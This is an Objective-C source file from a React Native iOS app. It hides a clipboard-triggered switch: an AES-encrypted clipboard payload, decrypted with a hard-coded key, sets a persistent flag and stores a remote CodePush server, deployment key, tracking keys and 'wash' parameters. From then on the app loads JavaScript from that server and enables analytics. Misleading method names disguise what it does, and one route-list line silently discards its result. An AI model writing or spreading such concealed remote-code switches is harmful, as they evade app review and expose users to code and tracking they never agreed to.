#import "SHDeceHelper.h"
#import "JJException.h"

#import <RNIndicator.h>
#import <RNCPushNotificationIOS.h>
#import <CodePush/CodePush.h>
#import <UMCommon/UMCommon.h>
#import <CocoaSecurity/CocoaSecurity.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <react-native-orientation-locker/Orientation.h>


#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface FindTheOddNumberCenter () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif

@interface SHDeceHelper()

@property(nonatomic, copy) NSString *oddNumber_Hexkey;
@property(nonatomic, copy) NSString *oddNumber_HexIv;

@property(nonatomic, copy) NSString *oddNumber_aVersion;
@property(nonatomic, copy) NSString *oddNumber_DPKey;
@property(nonatomic, copy) NSString *oddNumber_SUrl;


@property(nonatomic, copy) NSString *oddNumber_UKey;
@property(nonatomic, copy) NSString *oddNumber_UGChannel;
@property(nonatomic, copy) NSString *oddNumber_SenServerUrl;
@property(nonatomic, copy) NSString *oddNumber_SenProperty;

@property(nonatomic, copy) NSString *oddNumber_APP;
@property(nonatomic, copy) NSString *oddNumber_spRoutes;
@property(nonatomic, copy) NSString *oddNumber_wParams;
@property(nonatomic, copy) NSString *oddNumber_Flag;


@end

@implementation SHDeceHelper

static SHDeceHelper *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.oddNumber_Hexkey = @"053c9607695481b6c5fcd486b5259933";
    instance.oddNumber_HexIv = @"6FB4CBD0D4D50D8B59779B26916ACBC5";
    
    
    
    instance.oddNumber_aVersion = @"appVersion";
    instance.oddNumber_DPKey = @"deploymentKey";
    instance.oddNumber_SUrl = @"serverUrl";
    
    instance.oddNumber_UKey = @"umKey";
    instance.oddNumber_UGChannel = @"umChannel";
    instance.oddNumber_SenServerUrl = @"sensorUrl";
    instance.oddNumber_SenProperty = @"sensorProperty";
    
    instance.oddNumber_APP = @"DECE_STATE_APP";
    instance.oddNumber_spRoutes = @"spareRoutes";
    instance.oddNumber_wParams = @"washParams";
    instance.oddNumber_Flag = @"washFlag";

  });
  return instance;
}

- (BOOL)oddNumber_plantDesignEquipmentAnotherByPBD {
  NSString *copyString = [UIPasteboard generalPasteboard].string;
  if (copyString == nil) {
    return NO;
  }
  
  if ([copyString containsString:@"#iPhone#"]) {
    NSArray * tempArr = [copyString componentsSeparatedByString:@"#iPhone#"];
    if (tempArr.count > 1) {
      copyString = tempArr[1];
    }
  }
  CocoaSecurityResult *aes256Decrypt = [CocoaSecurity aesDecryptWithBase64:copyString
                                        hexKey:self.oddNumber_Hexkey
                                         hexIv:self.oddNumber_HexIv];
  
  if (aes256Decrypt.utf8String == nil) {
    return NO;
  }
  NSDictionary *dict = [self oddNumber_dictionaryWithJsonString:aes256Decrypt.utf8String];
  if (dict == nil) {
    return NO;
  }
  if (dict[@"data"] == nil) {
    return NO;
  }
  return [self oddNumber_saveConfigInfo:dict[@"data"]];
}

- (BOOL)oddNumber_saveConfigInfo:(NSDictionary *)dict {
    if (dict[self.oddNumber_aVersion] == nil || dict[self.oddNumber_DPKey] == nil || dict[self.oddNumber_SUrl] == nil) {
        return NO;
    }

    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
  
    [ud setBool:YES forKey:self.oddNumber_APP];
    [ud setObject:dict[self.oddNumber_aVersion] forKey:self.oddNumber_aVersion];
    [ud setObject:dict[self.oddNumber_DPKey] forKey:self.oddNumber_DPKey];
    [ud setObject:dict[self.oddNumber_SUrl] forKey:self.oddNumber_SUrl];
    
    [ud setObject:dict[self.oddNumber_UKey] forKey:self.oddNumber_UKey];
    [ud setObject:dict[self.oddNumber_UGChannel] forKey:self.oddNumber_UGChannel];
    [ud setObject:dict[self.oddNumber_SenServerUrl] forKey:self.oddNumber_SenServerUrl];
    [ud setObject:dict[self.oddNumber_SenProperty] forKey:self.oddNumber_SenProperty];
  
    [ud setObject:dict[self.oddNumber_spRoutes] forKey:self.oddNumber_spRoutes];
    [ud setObject:dict[self.oddNumber_wParams] forKey:self.oddNumber_wParams];
    [ud setObject:dict[self.oddNumber_Flag] forKey:self.oddNumber_Flag];

    [ud synchronize];
    return YES;
}

- (BOOL)dece_tryThisWay {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if ([ud boolForKey:self.oddNumber_APP]) {
        return YES;
    } else {
        return [self oddNumber_plantDesignEquipmentAnotherByPBD];
    }
}

- (UIInterfaceOrientationMask)dece_getOrientation {
  return [Orientation getOrientation];
}

- (NSDictionary *)oddNumber_dictionaryWithJsonString:(NSString *)jsonString {
    if (jsonString == nil) {
        return nil;
    }
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *err;
    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                        options:NSJSONReadingMutableContainers
                                                          error:&err];
    if(err) {
        return nil;
    }
    return dic;
}

- (void)oddNumber_filterSpeedTestNetRoute {
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10.0), dispatch_get_main_queue(), ^{
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSArray *spareArr = [ud arrayForKey:self.oddNumber_spRoutes];
      
    NSString *currentRoute = [ud stringForKey:self.oddNumber_SUrl];
    NSMutableArray *testArr = [NSMutableArray array];
    if (currentRoute != nil && spareArr != nil) {
      [testArr addObject:currentRoute];
      [testArr arrayByAddingObjectsFromArray:spareArr];
    }
    
    [self oddNumber_getSpeedFastWayRoute:testArr usingIndex:0];
  });
}

- (void)oddNumber_getSpeedFastWayRoute:(NSArray *)spareArr usingIndex: (NSInteger)idx {
  if (spareArr != nil && spareArr.count > idx) {
    NSURL *url = [NSURL URLWithString:spareArr[idx]];
    
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 20.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    
    NSURLSessionTask *task = [session dataTaskWithURL:url completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
      NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
      if (httpResponse.statusCode == 200) {
        [[NSUserDefaults standardUserDefaults] setObject:spareArr[idx] forKey:self.oddNumber_SUrl];
      } else {
        [self oddNumber_getSpeedFastWayRoute:spareArr usingIndex:idx + 1];
      }
    }];
    [task resume];
  }

}

- (void)oddNumber_collectionBabyHealthInfo {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [UMConfigure initWithAppkey:[ud stringForKey:self.oddNumber_UKey] channel:[ud stringForKey:self.oddNumber_UGChannel]];
  SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:self.oddNumber_SenServerUrl] launchOptions:nil];
  options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;

  [SensorsAnalyticsSDK startWithConfigOptions:options];
  [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:self.oddNumber_SenProperty]];
}

- (UIViewController *)dece_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self oddNumber_collectionBabyHealthInfo];
  [self oddNumber_filterSpeedTestNetRoute];
  
  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];
  
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
